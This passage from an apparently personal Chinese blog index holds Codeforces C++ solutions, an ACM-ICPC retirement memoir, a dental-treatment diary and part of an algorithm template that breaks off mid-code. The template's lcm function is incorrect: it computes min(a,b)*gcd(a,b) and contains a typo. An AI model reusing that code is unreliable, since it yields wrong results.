operator">&lt;</span>n<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                vector <span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> <span class="token function">sub</span><span class="token punctuation">(</span>_s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> _s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> tmp<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                    _s<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>_s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sub<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sub<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//  cout &lt;&lt; _s &lt;&lt; endl;</span>            <span class="token punctuation">&#125;</span>            ans <span class="token operator">=</span> <span class="token punctuation">(</span>ans <span class="token operator">+</span> tmp <span class="token operator">*</span> <span class="token punctuation">(</span>ans <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>ans<span class="token operator">+</span>mod<span class="token punctuation">)</span><span class="token operator">%</span>mod <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="D-Beingawesomeism"><a href="#D-Beingawesomeism" class="headerlink" title="D. Beingawesomeism"></a><a href="https://codeforces.com/contest/1281/problem/D">D. Beingawesomeism</a></h3><ul><li>题意：<br>给定一个行数为$r$ ，列数为$c$ 的由A和P组成的矩阵。可以进行多次操作。即选择一段连续的元素，一个方向，将该方向的所有元素都变成该段元素的复制。问最少进行多少次变化，可以使得该矩阵所有元素均为A。</li><li>题解&amp;代码：<br>仔细分析一下，发现最多只需要四次操作即可。分类讨论即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token punctuation">,</span> c<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span>grid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">col</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">row</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> c<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'A'</span><span class="token punctuation">)</span>                    row<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">,</span> col<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">,</span> tot<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tot<span class="token operator">==</span>r<span class="token operator">*</span>c<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tot<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>c <span class="token operator">||</span> row<span class="token punctuation">[</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>c <span class="token operator">||</span> col<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>r <span class="token operator">||</span> col<span class="token punctuation">[</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>r<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>row<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>row<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>c <span class="token operator">||</span>         <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>col<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>col<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>r <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span> <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span> <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span> <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span>         <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">||</span> row<span class="token punctuation">[</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">||</span> col<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">||</span> col<span class="token punctuation">[</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out", "w", stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> r <span class="token operator">>></span> c<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">grid</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cin <span class="token operator">>></span> grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token function">solve</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> c<span class="token punctuation">,</span> grid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ans<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"MORTAL"</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="E-Jeremy-Bearimy"><a href="#E-Jeremy-Bearimy" class="headerlink" title="E. Jeremy Bearimy"></a><a href="https://codeforces.com/contest/1281/problem/E">E. Jeremy Bearimy</a></h3><ul><li>题意：</li><li>题解&amp;代码：</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM经历</title>
      <link href="/2019/11/16/ACM%E7%BB%8F%E5%8E%86/"/>
      <url>/2019/11/16/ACM%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span><br>我是在2017年入学的，入学一个月好像就有实验室来招新了，但是不是打ICPC的，是我们学校新思路Geek组，我运气还算可以，通过了笔试面试，最后一个面试，我选择了算法方向，然后当时有两条路，一条是搞AI，也就是现在蛮火的人工智能，另一条就是ICPC。我高中是有碰到过搞算法竞赛的人的，感觉他们各个都蛮强，于是我想试试他们的路，就选择了ICPC那个方向，面试的人说高中没搞过这个大学搞有点头铁，我当时好像是和他一起哈哈哈的笑起来，也许我就是头铁吧。</p><p>训练是很艰苦的，但也是蛮有趣的，我当时都组织不起队友来，一直都很迷茫。但是没有放弃，我还是一直在打。第一年从新思路挖了个人过来，打了2、3个月就退队了，之后的暑假和学长一起训练，老师找了个数统院的人过来一起组队，过了暑假人就没了。最后我是和学长一起去参加比赛的，学长那个队伍有个人有事，就没有去参加那次比赛，然后我刚好做了个替补。运气很好，最后1h的时候我突发奇想做出了一道计算几何的题，拿到了一块铜牌。我当时很开心，真的蛮开心的，我之前去的一场比赛打铁了（ICPC没拿奖我们都戏称为打铁），这场比赛就拿铜了。后面的事就变的奇怪起来了，学长退役了，他们那边留下来的一个队友和我们组队，我正准备好好的参加暑假的多校联合训练，我的另一个队友决定不打比赛了。而且还是在差不多放暑假的时候，我当时其实是有点生气的，现在也释怀了，毕竟别人的人生，需要由自己来安排。参加多校很难受，也有心里准备，毕竟和清北上交这类学校一起训练，还有一些国内知名强校，杭电广工等，别人做出7、8题，我们只能做出1、2题，差距一直是有的，只不过我选择性忽视了这种差距，可能是我不想承认这种差距吧。</p><p>现在，一切尘埃落定，4铁退役，我感觉我对于ACM的投入太少了。</p><p>虽然不打ACM了，但是我应该还会偶尔打打CF，体验好，也不用感到很难过。</p><p>我多多少少受到了我们实验室学长的影响，学长说，要知道自己现在在干什么，干的目的是什么，不能浑浑噩噩的，不然什么事情都做不成，之后毕业了会很麻烦。这句话现在还在影响我，我觉得这个就是一个做人的态度。每个人都需要知道我现在，当下所干的事都是为后来的事服务的。你需要有一个目的，要不娱乐，要不学习新知识。这对于之后的学习、生活会有很大的帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牙齿治疗日记</title>
      <link href="/2019/11/16/%E7%89%99%E9%BD%BF%E6%B2%BB%E7%96%97%E6%97%A5%E8%AE%B0/"/>
      <url>/2019/11/16/%E7%89%99%E9%BD%BF%E6%B2%BB%E7%96%97%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h2 id="1-初次问诊"><a href="#1-初次问诊" class="headerlink" title="1. 初次问诊"></a>1. 初次问诊</h2><p>我是在高一的时候去看牙齿的，当时左边右边第一磨牙均是蛀牙。当时是我姐带我去绍兴市口腔医院做的。<br>医生当时先简单叩诊了我的牙齿，我左边第一磨牙有点疼，右边无感觉。我就决定先做左边的牙齿。打磨过后，我选择了2500+的烤瓷牙冠（后来经第二个医生矫正是嵌体）。我差不多去了两次吧，第一次除去蛀牙，第二次带上皇冠（指牙冠）手动滑稽。把左边的牙齿搞好之后，医生就开始了右边的牙齿的消除蛀牙。右边也选择了差不多的东西。后来我使用过程中，发现我左边牙齿一直疼，而且没有好转的迹象，我就去问医生该怎么办，医生说根管治疗，那就根管治疗吧。根管治疗过了4年之后，我的牙齿又开始疼起来了。</p><h2 id="2-再次就诊"><a href="#2-再次就诊" class="headerlink" title="2. 再次就诊"></a>2. 再次就诊</h2><p>这次我疼是有契机的，应该是炎症吧。我在疼之前2周左右，去厦门CCPC回来感冒发烧了，然后治了一半，就是吃药吃了一会儿我就感觉差不多，就停药继续开始浪了。之后口腔溃疡了，我也没怎么放在心上，口腔溃疡的第二天我的牙齿有点异样了，我没怎么注意，毕竟根管治疗神经都没了，怎么可能发生事情。后来越来越疼越来越疼。。。。我慌张的一匹，恰好这个时候南昌ICPC开始了，我就去打了，打比赛的时候全程演队友，唉这个也是一件伤心事，有时间之后写。我回来之后疼的受不了了，我就去校医院看了一下，校医院说你这个牙冠裂开了，我当时心里一震，完蛋。后来再次听到医保不给报，我心又凉了半截。刚拿到的奖学金没了，内心极其惆怅。校医院给我开了一盒阿莫西林，一盒甲硝锉，一盒罗比芬。我当时就在搜索哪个武汉哪个口腔比较好。发现武大口腔排名很前，就准备去挂号。看到网上挂号我惊了，这号根本不可能抢到啊。我问了一下我前队友，她说陆军总医院的医生水平还行，她母亲和奶奶都在那里做的根管，而且价格比较合理。我当时看武大口腔，去的人都说贵。而且我本人也挺喜欢军医的，就挂了那里的号，那我接下来，就来叙述一下我在陆军总医院的经历。</p><h3 id="2-1-根髓清理"><a href="#2-1-根髓清理" class="headerlink" title="2.1. 根髓清理"></a>2.1. 根髓清理</h3><p>时间：2019年11月13日</p><p>我进去医院看到的是两个小姐姐。当时我仔细和小姐姐说了一下病情，她说就先拍个片康康。然后另一个小姐姐就带我去拍X光片了。拍出来说我有两个根管忘记做了。。。。我当时心里一惊，心想完蛋。我问了一下我这个该怎么解决，她说要么清理出来再次根管治疗，要是中间要是断了就只能拔牙了。那我想着没办法了，也只能这么解决了。只能祈祷我根管不断了。上午做完之后，我感觉好多了，主治医生看我没有什么疼痛感觉了，就放我回来了。但是我一到寝室就疼，很疼很疼。于是我就立即和医生打电话说我好像不行了（手动滑稽），后来医生让我下午过去。下午小姐姐给我做了开放治疗，确实不疼了许多，至少能忍受了。接下来就是换药了，看治理情况了。</p><h3 id="2-2-跟随开放治疗"><a href="#2-2-跟随开放治疗" class="headerlink" title="2.2. 跟随开放治疗"></a>2.2. 跟随开放治疗</h3><p>时间：2019年11月17日</p><p>今天早上我去把我的药换了一下，我和医生大致说了一下我现在的情况：牙齿疼痛明显有好转，但是牙一侧的脸部肿了，然后有轻微肿痛。医生说我肿消了之后再封药，然后给我用小针戳了一下我的牙齿，我还是能感觉到酸痛感。医生给我再一次开放治疗，然后问了一下我是不是吃的药是甲硝锉+阿莫西林，我说是的，然后补充说止疼药停了。结束之后我们再次约了个时间：2019年11月22日。然后我就回学校了</p><h3 id="2-3-封药"><a href="#2-3-封药" class="headerlink" title="2.3. 封药"></a>2.3. 封药</h3><p>时间: 2019年11月24日</p><p>今天早上去做了一下封药。</p><h3 id="2-4-根管填充"><a href="#2-4-根管填充" class="headerlink" title="2.4. 根管填充"></a>2.4. 根管填充</h3><p>时间: 2019年12月8日</p><p>等了2个礼拜，终于把牙根最后填充完毕了。结束治疗。</p><h2 id="3-end……"><a href="#3-end……" class="headerlink" title="3. end……"></a>3. end……</h2>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YGLtemplate</title>
      <link href="/2019/11/16/YGLtemplate/"/>
      <url>/2019/11/16/YGLtemplate/</url>
      
        <content type="html"><![CDATA[<h3 id="1-最大公约数-最小公倍数"><a href="#1-最大公约数-最小公倍数" class="headerlink" title="1. 最大公约数 最小公倍数"></a>1. 最大公约数 最小公倍数</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll <span class="token function">gcd</span><span class="token punctuation">(</span>ll a<span class="token punctuation">,</span>ll b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> b<span class="token operator">==</span><span class="token number">0</span><span class="token operator">?</span>a<span class="token operator">:</span><span class="token function">gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">lcm</span><span class="token punctuation">(</span>lla <span class="token punctuation">,</span>ll b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-筛法"><a href="#2-筛法" class="headerlink" title="2. 筛法"></a>2. 筛法</h3><h4 id="2-1线性素数筛"><a href="#2-1线性素数筛" class="headerlink" title="2.1线性素数筛"></a>2.1线性素数筛</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//count 为素数个数</span><span class="token keyword">class</span> <span class="token class-name">GetPrime</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> cnt<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> check<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> prime<span class="token punctuation">;</span>    <span class="token function">GetPrime</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cnt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> prime<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">Go</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>check<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                prime<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>prime<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                check<span class="token punctuation">[</span>i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="2-2-莫比乌斯函数"><a href="#2-2-莫比乌斯函数" class="headerlink" title="2.2 莫比乌斯函数"></a>2.2 莫比乌斯函数</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//count 为素数个数</span><span class="token keyword">int</span> prime<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> isprime<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> mu<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">getmu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">clr</span><span class="token punctuation">(</span>isprime<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    mu<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5000000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> isprime<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>prime<span class="token punctuation">[</span><span class="token operator">++</span>count<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>             mu<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> count<span class="token punctuation">;</span> j<span class="token operator">++</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> maxn<span class="token operator">-</span><span class="token number">5</span> <span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            isprime<span class="token punctuation">[</span> i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">%</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>                mu<span class="token punctuation">[</span>i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>mu<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                mu<span class="token punctuation">[</span>i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="3-欧拉函数"><a href="#3-欧拉函数" class="headerlink" title="3. 欧拉函数"></a>3. 欧拉函数</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1e6</span> <span class="token operator">+</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> phi<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> prim<span class="token punctuation">[</span>maxn<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cnt<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">gephi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    phi<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>maxn<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            phi<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            prim<span class="token punctuation">[</span><span class="token operator">++</span>cnt<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>cnt<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> tp <span class="token operator">=</span> prim<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">*</span>tp<span class="token operator">></span>maxn<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            vis<span class="token punctuation">[</span>i<span class="token operator">*</span>tp<span class="token punctuation">]</span><span class="token 